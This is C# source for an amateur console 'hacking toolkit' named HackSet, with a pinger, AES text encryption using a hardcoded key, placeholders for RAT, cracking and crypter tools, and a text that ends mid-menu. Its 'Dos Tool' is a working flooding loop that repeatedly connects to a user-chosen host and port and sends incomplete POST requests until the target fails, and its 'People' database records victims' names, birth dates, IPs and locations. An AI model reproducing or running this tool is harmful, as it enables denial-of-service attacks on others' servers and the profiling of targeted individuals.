using System;
using System.Net;
using System.IO;

//Pinger
using System.Net.Sockets;
//using System.Diagnostics;
using System.Threading;
using System.Net.NetworkInformation;
//using System.Net.Http;

namespace HackSet
{
    class Program
    {
        static void Main(string[] args)
        {
            Start:
            string hacksetversion = "1.01";
            Console.BackgroundColor = ConsoleColor.Black; 
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("                                 ``.....```                                        ``.....``");
            Console.WriteLine("                            `.---.......---:-.`                             ``.-:--.......--:.`");
            Console.WriteLine("                          `-:.      `````   `-:/-.                       `.---.   `````      .-:.");
            Console.WriteLine("                         .:.          `.-/+syso//:-`                    `...:+sso+:.`          `:-`");
            Console.WriteLine("                       `-:`                  .+ymds:.                   .-//:.`                  --`");
            Console.WriteLine("                       .:`   `...``             `:oo:`                `-:-`              `````    --`");
            Console.WriteLine("                       ..-ohNNMMNNNmdyo/.          `-:.`            `--`          `:+ydmNmhs/:::-.`.`");
            Console.WriteLine("                        `.:ohdNNNNNMMMMMNms:`        `--           .-`         -odNMMMMMNms/.    ``");
            Console.WriteLine("                          `.:+yhdmddddNMMMMMNs-     /:::`          ...:`    .omMMMMMNmdddy+-`");
            Console.WriteLine("                            `.:+ydmNNNMMMMMMMMNd/   :y+-            `::   -yNMMMMMMMMMNNms/.");
            Console.WriteLine("                              `.+ymNNmddNMNMMMMMMd/  //.            .:  -hNMMMMMNMNddmmNmy/.");
            Console.WriteLine("                              .-::-:/+++hN+///oymMMh-`/-           `/``yNMNhs+///mmo++/:--:-`");
            Console.WriteLine("                            `-:`.ohyo/:-...-://:--omNo:+.`       `./+/mNy:-////--..-:/oshs:`--`    ```");
            Console.WriteLine("                     `...``-:.`+o-`            `.:`.dNmd-:`     `--ymNN- --`            `.+o``:-.`.-.-`");
            Console.WriteLine("                     .:/---.` +y-`              `.  oMMm./.     `:-hMMh  .`              `-oy  .---+o/.");
            Console.WriteLine("                    `-/+:.----`-/ooo+++/++/++++/:.:sNMMd +-.```../.oMMMh/.:/++++/++/++++oo+:``...`-/+:.");
            Console.WriteLine("                   `.:+smNNNNNms/-......+y..-:/ohmNMMMMo hyso+osyh.:MMMMNmy/-....oo........-://::::--..`");
            Console.WriteLine("                   ``:+yhhysssso+/:::::---.-:+ymNNMMMMN. NMNmhdNNN- dMMNdy+:-.....--:---..```      `..``");
            Console.WriteLine("                     `..--....```            .:+symNMM+  NMMmddMMM- -mmy+-`");
            Console.WriteLine("                                               `-/sdmo   NMMmddMMM:  -s/.");
            Console.WriteLine("                                                 `:o/   `MMMmddMMM/   .:.`");
            Console.WriteLine("                                                `.:.`/: .MMMmddMMM+ ./``:-`");
            Console.WriteLine("                                               `--`/dNs :MMMmddMMMs :Mm+..:.`");
            Console.WriteLine("                                         `.-.-//.:hNMM/ sMMNmmmNMMd .MMMm+.::-..-`");
            Console.WriteLine("                    `.`--```       ```.---.``od-sNMMMM- dMMNdddmMMN.`NMMMMh.ys. `---.```         `.-`.`");
            Console.WriteLine("                    `--`.:://////:::--...:+ymMM+NMMMMM: NMMMNmmNMMM:`NMMMMM+NMmh+:-..--------------`.:`");
            Console.WriteLine("                     .:`  -+-```-//+oshmmNMMMMMmmMMdhmh.+dNMMMMMNds.omdhNMNdMMMMMNNmdyo+//:```.//   :-");
            Console.WriteLine("                      -:  `hm-  .sNMMMMMMMMMMMMMMMMy/:oms//:///://ody::oMMMMMMMMMMMMMMMMMh-  .hm.  --`");
            Console.WriteLine("                      `--  .dN+   :dMMMMMMMMMMMMMMMMMNh+/syyyyysys+/yNNMMMMMMMMMMMMMMMMN+`  -mN:  -:`");
            Console.WriteLine("                       `:-  -mMs`  `oNMMMMMMMMMMMMMMNs.    `````    `+mMMMMMMMMMMMMMMMy.   +NN/  .:`");
            Console.WriteLine("                        `:-  -mMh.   -hMMMMMMMMMNNmy:      `oys.      .sdNNMMMMMMMMMd/   `sMN/  .:.");
            Console.WriteLine("                         `--  -dMm/   `-/////::--.`       :dMMMm+`      `..-:::////:`   -dMm/  -:`");
            Console.WriteLine("                          `-:` `oNNy-                   `sNMMMMMMh-                   `oNNy.  --`");
            Console.WriteLine("                           `.:`  :hNNy/::::::::::--....:hNNNNNmNNNd/....--::::::::::/smNd/  `:-`");
            Console.WriteLine("                             .:. `osymMMMMMMMMMMMMdo+/////::::::::////+ohNMMMMMMMMMMMmhss. .:.`");
            Console.WriteLine("                              `-:``ymhshdNMMMMMMMMMMMMNNNNNNNNNNNNNNNMMMMMMMMMMMMNmhyydd- --`");
            Console.WriteLine("                               `.:.`sNMmdhhdNMMMNdmNmmMMMMMMMMMMMMMMNmhhhyyyyyyssshmNMh.`:-`");
            Console.WriteLine("                                 `--`/mMMMMMNMMMmdmdddNNNNNNNNNNNNmdy+:::---....:+ydmo`--`");
            Console.WriteLine("                                   .:--hMMMMNNmdysoo+ooso:--------//-`           ./o:.:.`");
            Console.WriteLine("                                    `-:-sNMMNdyo:.``````-/.     `:-`            `.-.--`");
            Console.WriteLine("                                      `-:+dNNdo:`        -/     -:`             `.`.`");
            Console.WriteLine("                                       `.:/ydy+-        `:-     ./`               `");
            Console.WriteLine("                                         `.-/:-`        ./`      :-");
            Console.WriteLine("                                            ```         -:       -:");
            Console.WriteLine("                                                        -:       -:");
            Console.WriteLine("                                                        ./       ::");
            Console.WriteLine("                                                        ./`      /.");
            Console.WriteLine("                                                        `:-     ./`");
            Console.WriteLine("                                                         -/     --");
            Console.WriteLine("                                                         ./`    /.");
            Console.WriteLine("                                                          -:`  --`");
            Console.WriteLine("                                                           `...``");
            Console.WriteLine("      `...`     `....``    `..`      `..`     `..`     `....``      `....`   `.`    ..`   `..     `....`    `...`");
            Console.WriteLine("    `smmddd/  `sdmmmmmd+   mNNm/    -mNNm`    hNNm.    hNNddmdo   .ymmmmmmh: oNm-  /NN- -odMM-   :dmmNNd/  odddNNh`");
            Console.WriteLine("    /MM:` .. `dMh-  `/NMo  MMyMN.  `dMsMM`   oMhhMh    dMy  +MM. -NMs.  `oMM/ sMm.:NN:  so+MM-   .:``:MMd  -.  +MM/");
            Console.WriteLine("    `hNNhs:` /MM-     hMm  MM/sMh  yMs:MM`  -NN..NM+   dMmssmMs  sMN`     mMh  sMdNN:     -MM-       oMN/   osymNs`");
            Console.WriteLine("      -/yNMd`+MM-     hMm  MM:`mMo/Md`:MM` `dMh//hMN.  dMd//oNMs sMN`     NMy   yMM/      -MM-     -hMd:    //+yMNo");
            Console.WriteLine("    --```oMM..mMh.```+MN/  MM: -MMNN- :MM` sMmyyyymMd` dMy```dMd -NMs.``.sMN-   /MM`    ``:MM:`  .yMN+```  -```.NMm");
            Console.WriteLine("    +mmddNd:  .smNmdmmy:   NN:  oNN+  :NN`-NN-    -NN+ hNmddmms.  -yNNddNms.    /NN`    sdmNNmd+ yNNmmmmm:`dmddNNy-");
            Console.WriteLine("      ...`       `...      ``    ``    ``  ``      ```  ````         `..`        ``     ```````   ```````   `...   ");
            Console.WriteLine("");
            Console.WriteLine("Made by: Somaboy123");
            Console.WriteLine("HACK SET V" + hacksetversion);
            Console.WriteLine("Commands:");
            Console.WriteLine("-Ip");
            Console.WriteLine("-Tools");
            Console.WriteLine("-Database");
            Console.WriteLine("-Help");
            Console.WriteLine("-Exit");
            switch (Console.ReadLine()){

                /*Get local hostname & IP*/
                case "Ip":
                    Console.Clear();
                    string hostName = Dns.GetHostName();
                    string myMAC = Dns.GetHostByName(hostName).AddressList[0].ToString();
                    string publicIP = new WebClient().DownloadString("http://icanhazip.com");
                    WebClient ipClient = new WebClient();
                    string location = ipClient.DownloadString("https://api.ipdata.co/country_name?api-key=test");
                    Console.WriteLine("Hostname: " + hostName);
                    Console.WriteLine("IP: " + "*Havent fixed this bug...*"); //FIX THIS!!!!!!!!!!!!!
                    Console.WriteLine("MAC: " + myMAC);
                    Console.WriteLine("");
                    Console.WriteLine("Public IP: " + publicIP);
                    Console.WriteLine("Location: " + location);
                    Console.WriteLine("");
                    Console.WriteLine("-Back");
                    string ipBack = Console.ReadLine();
                    if(ipBack == "Back"){
                        Console.Clear();
                        goto Start;
                    }
                    break;

                //Tools
                case "Tools":
                    ToolsStart:
                    Console.Clear();
                    Console.WriteLine("Tool Categories:");
                    Console.WriteLine("-Pinger");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("-Ratting");
                    Console.WriteLine("-Cracking");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("-Crypting");
                    Console.WriteLine("-Decrypting");
                    Console.WriteLine("-Dos");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("-Tracking");
                    Console.WriteLine("-Mail");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("-Back");
                    switch(Console.ReadLine()){

                        //Pinger V1.0
                        case "Pinger":
                            PingerStart:
                            TcpClient tcpClient = new TcpClient();
                            int port = 80;
                            TcpClient client;
                            Console.Clear();
                            Console.WriteLine("Pinger V1.0");
                            Console.WriteLine("Made by: Somaboy123");
                            Console.WriteLine("Enter IP or URL:");
                            string ip = Console.ReadLine();
                            Ping ping = new Ping();
                            try
                            {
                                PingReply pingresult = ping.Send(ip);
                                if (pingresult.Status.ToString() == "Success")
                                {
                                    Console.WriteLine("Online");
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("Offline");
                                    Console.ForegroundColor = ConsoleColor.Green;
                                }
                                Console.WriteLine("Want to use Pinger again? (y/n)");
                                switch (Console.ReadLine())
                                {
                                    case "y":
                                        Console.Clear();
                                        goto PingerStart;

                                    default:
                                        Console.Clear();
                                        goto ToolsStart;
                                }
                             
                            }
                            catch
                            {
                                Console.Clear();
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Pinger Error");
                                Console.WriteLine("( " + ip + " )" + " isn't correct!");
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("");
                                Console.WriteLine("Try again? (y/n)");
                                switch (Console.ReadLine())
                                {
                                    case "y":
                                        Console.Clear();
                                        goto PingerStart;

                                    default:
                                        Console.Clear();
                                        goto ToolsStart;
                                }



                            }

                    //Ratting
                    case "Ratting":
                        Console.Clear();
                        Console.WriteLine("None RAT functions are added to this version");
                        goto ToolsStart;

                    //Cracking
                    case "Cracking":
                        Console.Clear();
                        Console.WriteLine("None Cracking functions are added to this version");
                        goto ToolsStart;

                    //Crypting
                    case "Crypting":
                            CryptingStart:
                            Console.Clear();
                            Console.WriteLine("Crypting");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("-NetCrypter (.Net)");
                            Console.WriteLine("-NativeCrypter (Native)");
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("-TextCrypter");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("-Binder");
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("-Back");
                            switch (Console.ReadLine())
                            {
                                case "TextCrypter":
                                    TextCrypterStart:
                                    Console.Clear();
                                    var textcrypterkey = "b14ca5898a4e4133bbce2ea2315a1916";
                                    Console.WriteLine("TextCrypter V1.0");
                                    Console.WriteLine("Made by: Somaboy123");
                                    Console.WriteLine("Enter the text you need encrypted:");
                                    var textcrypterstr = Console.ReadLine();
                                    Console.Clear();
                                    Console.WriteLine("Encryption key");
                                    Console.WriteLine("-Default");
                                    Console.WriteLine("-Custom");
                                    switch (Console.ReadLine())
                                    {
                                        case "Default":
                                            var textcrypterencryptedString = AesOperation.EncryptString(textcrypterkey, textcrypterstr);
                                            Console.Clear();
                                            Console.WriteLine("Encrypted text: " + textcrypterencryptedString);
                                            Console.WriteLine("");
                                            Console.WriteLine("Want to use TextCrypter again? (y/n)");
                                            switch (Console.ReadLine())
                                            {
                                                case "y":
                                                    goto TextCrypterStart;

                                                default:
                                                    Console.Clear();
                                                    goto CryptingStart;
                                            }

                                        case "Custom":
                                            Console.Clear();
                                            Console.WriteLine("Enter encryption key:");
                                            textcrypterkey = Console.ReadLine();
                                            try
                                            {
                                                var textcryptercustomencryptedString = AesOperation.EncryptString(textcrypterkey, textcrypterstr);
                                                Console.Clear();
                                                Console.WriteLine("Encrypted text: " + textcryptercustomencryptedString);
                                                Console.WriteLine("");
                                                Console.WriteLine("Want to use TextCrypter again? (y/n)");
                                                switch (Console.ReadLine())
                                                {
                                                    case "y":
                                                        goto TextCrypterStart;

                                                    default:
                                                        Console.Clear();
                                                        goto CryptingStart;
                                                }
                                            }
                                            catch
                                            {
                                                Console.Clear();
                                                Console.ForegroundColor = ConsoleColor.Red;
                                                Console.WriteLine("TextCrypter Error");
                                                Console.WriteLine("Encryption key has to be 128, 198, 256 characters long");
                                                Console.ForegroundColor = ConsoleColor.Green;
                                                Console.WriteLine("");
                                                Console.WriteLine("Try again? (y/n)");
                                                switch (Console.ReadLine())
                                                {
                                                    case "y":
                                                        goto TextCrypterStart;

                                                    default:
                                                        Console.Clear();
                                                        goto CryptingStart;
                                                }

                                            }

                                        default:
                                            Console.Clear();
                                            goto TextCrypterStart;
                                    }

                                case "Back":
                                    Console.Clear();
                                    goto ToolsStart;

                                default:
                                    Console.Clear();
                                    goto CryptingStart;
                            }

                    //Decrypting
                    case "Decrypting":
                            DecryptingStart:
                            Console.Clear();
                            Console.WriteLine("Decrypting");
                            Console.WriteLine("-TextDecrypter");
                            Console.WriteLine("-Back");
                            switch (Console.ReadLine())
                            {
                                case "TextDecrypter":
                                    TextDecrypterStart:
                                    Console.Clear();
                                    var textdecrypterkey = "b14ca5898a4e4133bbce2ea2315a1916";
                                    Console.WriteLine("TextDecrypter V1.0");
                                    Console.WriteLine("Made by: Somaboy123");
                                    Console.WriteLine("Enter encrypted text:");
                                    var textdecryptertext = Console.ReadLine();
                                    Console.Clear();
                                    Console.WriteLine("Decryption key:");
                                    Console.WriteLine("-Default");
                                    Console.WriteLine("-Custom");
                                    switch (Console.ReadLine())
                                    {
                                        case "Default":
                                            var textdecrypterdecrypted = AesOperation.DecryptString(textdecrypterkey, textdecryptertext);
                                            Console.Clear();
                                            Console.WriteLine("Decrypted text: " + textdecrypterdecrypted);
                                            Console.WriteLine("");
                                            Console.WriteLine("Want to use TextDecrypter again? (y/n)");
                                            switch (Console.ReadLine())
                                            {
                                                case "y":
                                                    goto TextDecrypterStart;

                                                default:
                                                    Console.Clear();
                                                    goto DecryptingStart;
                                            }

                                        case "Custom":
                                            Console.Clear();
                                            Console.WriteLine("Enter the decryption key:");
                                            textdecrypterkey = Console.ReadLine();
                                            try
                                            {
                                                var textdecryptercustomdecrypted = AesOperation.DecryptString(textdecrypterkey, textdecryptertext);
                                                Console.Clear();
                                                Console.WriteLine("Decrypted text: " + textdecryptercustomdecrypted);
                                                Console.WriteLine("");
                                                Console.WriteLine("Want to use TextDecrypter again? (y/n)");
                                                switch (Console.ReadLine())
                                                {
                                                    case "y":
                                                        goto TextDecrypterStart;

                                                    default:
                                                        Console.Clear();
                                                        goto DecryptingStart;
                                                }
                                            }
                                            catch
                                            {
                                                Console.Clear();
                                                Console.ForegroundColor = ConsoleColor.Red;
                                                Console.WriteLine("TextDecrypter Error");
                                                Console.WriteLine("Decryption key has to be 128, 196, 256 characters long");
                                                Console.ForegroundColor = ConsoleColor.Green;
                                                Console.WriteLine("");
                                                Console.WriteLine("Try again? (y/n)");
                                                switch (Console.ReadLine())
                                                {
                                                    case "y":
                                                        goto TextDecrypterStart;

                                                    default:
                                                        Console.Clear();
                                                        goto DecryptingStart;
                                                }
                                            }


                                        default:
                                            Console.Clear();
                                            goto TextDecrypterStart;
                                    }


                                case "Back":
                                    Console.Clear();
                                    goto ToolsStart;

                                default:
                                    Console.Clear();
                                    goto DecryptingStart;
                            }

                    //Dos Tool V1.0
                    case "Dos":
                        DosStart:
                        Console.Clear();
                        Console.WriteLine("Dos Tool V1.0");
                        Console.WriteLine("Made by: Somaboy123");
                        Console.WriteLine("Enter IP or URL:");
                        string dosip = Console.ReadLine();
                        Console.WriteLine("Enter port(default 80):");
                        string dosport = Console.ReadLine();
                        Console.WriteLine("Enter thread amount:");
                        string dosthreads = Console.ReadLine();
                        DosCorrect:
                        Console.Clear();
                        Console.WriteLine("IP/URL: " + dosip);
                        Console.WriteLine("Port: " + dosport);
                        Console.WriteLine("Threads: " + dosthreads);
                        Console.WriteLine("Is this correct? (y/n)");
                        Console.WriteLine("Press ESC to stop Dos Attack");
                            switch (Console.ReadLine()) {
                                case "y":
                                    Console.Clear();
                                    Console.WriteLine("Press ESC to stop");
                                    Console.WriteLine("Connecting please wait...");
                                    //int dosipint = Int32.Parse(dosip);
                                    try
                                    {
                                        int dosportint = Int32.Parse(dosport);
                                        int dosthreadsint = Int32.Parse(dosthreads);
                                        for (int i = 0; i < dosthreadsint; i++)
                                        {
                                            Thread.CurrentThread.IsBackground = true;
                                            //Console.WriteLine("test1");

                                            while (true)
                                            {
                                                while (!(Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape))
                                                {
                                                    string Dostime = DateTime.Now.ToString("h:mm:ss tt");
                                                    try
                                                    {
                                                        TcpClient Dosclient = new TcpClient();
                                                        Dosclient.NoDelay = true;
                                                        Dosclient.Connect(dosip, dosportint); //Connect
                                                        StreamWriter stream = new StreamWriter(Dosclient.GetStream());
                                                        stream.Write("POST / HTTP/1.1\r\nHost: " + dosip + "\r\nContent-length: 5000\r\n\r\n"); //Send a packet
                                                        stream.Flush();
                                                        Dosclient.Close();
                                                        Console.WriteLine("[ " + Dostime + "]" + " Server Up");
                                                    }
                                                    catch
                                                    {
                                                        Console.ForegroundColor = ConsoleColor.Red;
                                                        Console.WriteLine("[ " + Dostime + "]" + " Server Down");//Error or server is down
                                                        Console.ForegroundColor = ConsoleColor.Green;
                                                    }
                                                }
                                                Thread.CurrentThread.IsBackground = false;
                                                Console.Clear();
                                                Console.WriteLine("Want to use the Dos tool again? (y/n)");
                                                switch (Console.ReadLine())
                                                {
                                                    case "y":
                                                        goto DosStart;

                                                    case "n":
                                                        Console.Clear();
                                                        goto ToolsStart;
                                                }
                                            }
                                        }
                                        while (true) ;
                                    }
                                    catch
                                    {
                                        Console.Clear();
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine("Dos Error");
                                        Console.WriteLine("Port/Threads have to be a valid number");
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine("");
                                        Console.WriteLine("Try again? (y/n)");
                                        switch (Console.ReadLine())
                                        {
                                            case "y":
                                                goto DosStart;

                                            default:
                                                Console.Clear();
                                                goto ToolsStart;
                                        }
                                    }
                                    

                                case "n":
                                    Console.Clear();
                                    Console.WriteLine("IP/URL: " + dosip);
                                    Console.WriteLine("Port: " + dosport);
                                    Console.WriteLine("Threads: " + dosthreads);
                                    Console.WriteLine("What is not correct?");
                                    Console.WriteLine("-Ip");
                                    Console.WriteLine("-Port");
                                    Console.WriteLine("-Threads");
                                    switch (Console.ReadLine()) {
                                        case "Ip":
                                            Console.Clear();
                                            Console.WriteLine("IP/URL: " + dosip);
                                            Console.WriteLine("Enter correct IP/URL:");
                                            dosip = Console.ReadLine();
                                            goto DosCorrect;

                                        case "Port":
                                            Console.Clear();
                                            Console.WriteLine("Port: " + dosport);
                                            Console.WriteLine("Enter correct port:");
                                            dosport = Console.ReadLine();
                                            goto DosCorrect;

                                        case "Threads":
                                            Console.Clear();
                                            Console.WriteLine("Threads: " + dosthreads);
                                            Console.WriteLine("Enter correct threads:");
                                            dosthreads = Console.ReadLine();
                                            goto DosCorrect;
                                    }
                                goto DosStart;
                        }

                        goto ToolsStart;

                    case "Back":
                        Console.Clear();
                        goto Start;

                    default:
                        Console.Clear();
                        Console.WriteLine("Unknown Command");
                        goto ToolsStart;
                    }


                //Database
                case "Database":
                    DatabaseStart:
                    Console.Clear();
                    Console.WriteLine("Database to save all data you hacked/cracked or whatever");
                    Console.WriteLine("Commands:");
                    Console.WriteLine("-Wifi");
                    Console.WriteLine("-People");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("-Passwords");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("-Back");
                    switch(Console.ReadLine()){

                        //Database Wifi
                        case "Wifi":
                            DatabaseWifiStart:
                            Console.Clear();
                            System.IO.Directory.CreateDirectory("database");
                            System.IO.Directory.CreateDirectory(@"database/wifi");
                            Console.WriteLine("Wifi Password Database");
                            Console.WriteLine("Commands");
                            Console.WriteLine("-Add");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("-Delete");
                            Console.WriteLine("-List");
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("-Back");
                            switch(Console.ReadLine()){
                                case "Add":
                                    Console.Clear();
                                    Console.WriteLine("Enter Wifi hostname (router name)");
                                    string wifiHostname = Console.ReadLine();
                                    Console.WriteLine("Enter Wifi password");
                                    string wifiPassword = Console.ReadLine();
                                    Console.WriteLine("Enter Wifi Ip");
                                    string wifiIp = Console.ReadLine();
                                    Console.WriteLine("Enter open ports fill in like(80, 1234, etc)");
                                    string wifiPorts = Console.ReadLine();
                                    Console.WriteLine("Enter additional info");
                                    string wifiInfo = Console.ReadLine();
                                    Console.Clear();
                                    WifiSave:
                                    Console.WriteLine("Hostname: " + wifiHostname);
                                    Console.WriteLine("Password: " + wifiPassword);
                                    Console.WriteLine("Ip: " + wifiIp);
                                    Console.WriteLine("Ports: " + wifiPorts);
                                    Console.WriteLine("");
                                    Console.WriteLine("Info");
                                    Console.WriteLine(wifiInfo);
                                    Console.WriteLine("");
                                    Console.WriteLine("Is this information correct? (y/n)");
                                    switch(Console.ReadLine()){
                                        case "y":
                                            var wifiFile = @"database/wifi/" + wifiHostname + ".txt";
                                            File.WriteAllText(wifiFile, "Hostname: " + wifiHostname + Environment.NewLine +
                                            "Password: " + wifiPassword + Environment.NewLine +
                                            "Ip: " + wifiIp + Environment.NewLine +
                                            "Ports: " + wifiPorts + Environment.NewLine + Environment.NewLine +
                                            "Info" + Environment.NewLine +
                                            wifiInfo);
                                            Console.Clear();
                                            goto DatabaseWifiStart;

                                        case "n":
                                            Console.WriteLine("What information is not correct?");
                                            Console.WriteLine("-Hostname");
                                            Console.WriteLine("-Password");
                                            Console.WriteLine("-Ip");
                                            Console.WriteLine("-Ports");
                                            Console.WriteLine("-Info");
                                            Console.WriteLine("-Back");
                                            switch(Console.ReadLine()){
                                                case "Hostname":
                                                    Console.Clear();
                                                    Console.WriteLine("Change hostname " + wifiHostname + " to:");
                                                    string newwifiHostname = Console.ReadLine();
                                                    wifiHostname = newwifiHostname;
                                                    Console.Clear();
                                                    goto WifiSave;

                                                case "Password":
                                                    Console.Clear();
                                                    Console.WriteLine("Change " + wifiHostname + "'s password to:");
                                                    string newwifiPassword = Console.ReadLine();
                                                    wifiPassword = newwifiPassword;
                                                    Console.Clear();
                                                    goto WifiSave;

                                                case "Ip":
                                                    Console.Clear();
                                                    Console.WriteLine("Change " + wifiHostname + "'s ip to:");
                                                    string newwifiIp = Console.ReadLine();
                                                    wifiIp = newwifiIp;
                                                    Console.Clear();
                                                    goto WifiSave;

                                                case "Ports":
                                                    Console.Clear();
                                                    Console.WriteLine("Change " + wifiHostname + "'s ports to:");
                                                    string newwifiPorts = Console.ReadLine();
                                                    wifiPorts = newwifiPorts;
                                                    Console.Clear();
                                                    goto WifiSave;

                                                case "Info":
                                                    Console.Clear();
                                                    Console.WriteLine("Change " + wifiHostname + "'s info to:");
                                                    string newwifiInfo = Console.ReadLine();
                                                    wifiInfo = newwifiInfo;
                                                    Console.Clear();
                                                    goto WifiSave;

                                                default:
                                                    Console.Clear();
                                                    goto WifiSave;;
                                            }

                                            default:
                                                goto WifiSave;
                                    }

                                case "Delete":
                                    Console.Clear();
                                    goto DatabaseWifiStart;

                                case "List":
                                    Console.Clear();
                                    goto DatabaseWifiStart;

                                case "Back":
                                    Console.Clear();
                                    goto DatabaseStart;

                                default:
                                    Console.Clear();
                                    goto DatabaseStart;
                            }

                    //Database People
                    case "People":
                        DatabasePeopleStart:
                        Console.Clear();
                        System.IO.Directory.CreateDirectory("database");
                        System.IO.Directory.CreateDirectory(@"database/people");
                        Console.WriteLine("People Database");
                        Console.WriteLine("Commands:");
                        Console.WriteLine("-Add");
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("-Delete");
                        Console.WriteLine("-List");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("-Back");
                        switch(Console.ReadLine()){
                            case "Add":
                                Console.Clear();
                                Console.WriteLine("Enter the name of the person you want to add");
                                string personName = Console.ReadLine();
                                Console.Clear();
                                Console.WriteLine("Enter the Birthyear. optional the birthdate");
                                string personBirth = Console.ReadLine();
                                Console.Clear();
                                Console.WriteLine("Enter the gender (male/female)");
                                string personGender = Console.ReadLine();
                                Console.Clear();
                                Console.WriteLine("Enter the persons IP");
                                string personIp = Console.ReadLine();
                                Console.Clear();
                                Console.WriteLine("Enter the location of this person");
                                string personLocation = Console.ReadLine();
                                Console.Clear();
                                Console.WriteLine("Enter all additional info you want to add");
                                string personInfo = Console.ReadLine();
                                Console.Clear();
                                PersonSave:
                                Console.WriteLine("Name: " + personName);
                                Console.WriteLine("Birth: " + personBirth);
                                Console.WriteLine("Gender: " + personGender);
                                Console.WriteLine("Ip: " + personIp);
                                Console.WriteLine("Location: " + personLocation);
                                Console.WriteLine("");
                                Console.WriteLine("Info");
                                Console.WriteLine(personInfo);
                                Console.WriteLine("");
                                Console.WriteLine("Is this information correct? (y/n)");
                                switch(Console.ReadLine()){
                                    case "y":
                                        var personFile = @"database/people/" + personName + ".txt";
                                        File.WriteAllText(personFile, "Name: " + personName + Environment.NewLine +
                                        "Birth: " + personBirth + Environment.NewLine +
                                        "Gender: " + personGender + Environment.NewLine +
                                        "Ip: " + personIp + Environment.NewLine +
                                        "Location: " + personLocation + Environment.NewLine + Environment.NewLine +
                                        "Info" + Environment.NewLine +
                                        personInfo);
                                        Console.Clear();
                                        goto DatabasePeopleStart;

                                    case "n":
                                        Console.WriteLine("What information is not correct?");
                                        Console.WriteLine("-Name");
                                        Console.WriteLine("-Birth");
                                        Console.WriteLine("-Gender");
                                        Console.WriteLine("-Ip");
                                        Console.WriteLine("-Location");
                                        Console.WriteLine("-Info");
                                        Console.WriteLine("-Back");
                                        switch(Console.ReadLine()){
                                            case "Name":
                                                Console.Clear();
                                                Console.WriteLine("Change name " + personName + " to:");
                                                string newpersonName = Console.ReadLine();
                                                personName = newpersonName;
                                                Console.Clear();
                                                goto PersonSave;

                                            case "Birth":
                                                Console.Clear();
                                                Console.WriteLine("Change " + personName + "'s Birth to:");
                                                string newpersonBirth = Console.ReadLine();
                                                personBirth = newpersonBirth;
                                                Console.Clear();
                                                goto PersonSave;

                                            case "Gender":
                                                Console.Clear();
                                                Console.WriteLine("Change " + personName + "'s Gender to:");
                                                string newpersonGender = Console.ReadLine();
                                                personGender = newpersonGender;
                                                Console.Clear();
                                                goto PersonSave;

                                            case "Ip":
                                                Console.Clear();
                                                Console.WriteLine("Change " + personName + "'s Ip to:");
                                                string newpersonIp = Console.ReadLine();
                                                personIp = newpersonIp;
                                                Console.Clear();
                                                goto PersonSave;
    
                                            case "Location":
                                                Console.Clear();
                                                Console.WriteLine("Change " + personName + "'s Location to:");
                                                string newpersonLocation = Console.ReadLine();
                                                personLocation = newpersonLocation;
                                                Console.Clear();
                                                goto PersonSave;

                                            case "Info":
                                                Console.Clear();
                                                Console.WriteLine("Change " + personName + "'s Info to:");
                                                string newpersonInfo = Console.ReadLine();
                                                personInfo = newpersonInfo;
                                                Console.Clear();
                                                goto PersonSave;

                                            case "Back":
                                                Console.Clear();
                                                goto PersonSave;

                                            default:
                                                Console.Clear();
                                                goto PersonSave;
                                        }

                                }
                                break;

                            case "Back":
                                Console.Clear();
                                goto DatabaseStart;

                            default:
                                Console.Clear();
                                goto DatabasePeopleStart;
                        }
                        break;

                    //Database Passwords
                    case "Passwords":
                        Console.Clear();
                        System.IO.Directory.CreateDirectory("database");
                        System.IO.Directory.CreateDirectory(@"database/passwords");
                        Console.WriteLine("Account Passwords Database");
                        goto DatabaseStart;

                    case "Back":
                        Console.Clear();
                        goto Start;

                    default:
                        Console.Clear();
                        goto DatabaseStart;
                }
                break;

                //Help
                case "Help":
                    Console.Clear();
                    Console.WriteLine("Help");
                    Console.WriteLine("Version: " + hacksetversion);
                    Console.WriteLine("");
                    Console.WriteLine("I'm not responsible if you use these tools for malicious purpose!");
                    Console.WriteLine("");
                    Console.WriteLine("The things that aren't implemented yet or dont work at the moment are colored red.");
                    Console.WriteLine("If you are having the issue that it goes back to the main page, I didn't fix this yet.");
                    Console.WriteLine("It happens because you didnt use capital letter or you mispelled something, I will fix it asap so it will let you know");
                    Console.WriteLine("if you misspelled or forgot capital letter.");
                    Console.WriteLine("");
                    Console.WriteLine("New in V" + hacksetversion + ":");
                    Console.WriteLine(" -More IP Info");
                    Console.WriteLine(" -Pinger V1.0");
                    Console.WriteLine(" -Dos Tool V1.0");
                    Console.WriteLine(" -TextCrypter V1.0");
                    Console.WriteLine(" -TextDecrypter V1.0");
                    Console.WriteLine(" -Known Crashes Fixed");
                    Console.WriteLine(" -Things that are not implemented or dont work *yet are now Red");
                    Console.WriteLine(" -If use Back you go to previous page instead of main page");
                    Console.WriteLine("");
                    Console.WriteLine("Updates");
                    Console.WriteLine("Goto my github to check if there is a newer version available.");
                    Console.WriteLine("Current Version: " + hacksetversion);
                    Console.WriteLine("https://github.com/Somaboy123/Hackset");
                    Console.WriteLine("");
                    Console.WriteLine("Contact");
                    Console.WriteLine("For bug reports goto my Github page to report them.");
                    Console.WriteLine("If you want to contact me pm me on:");
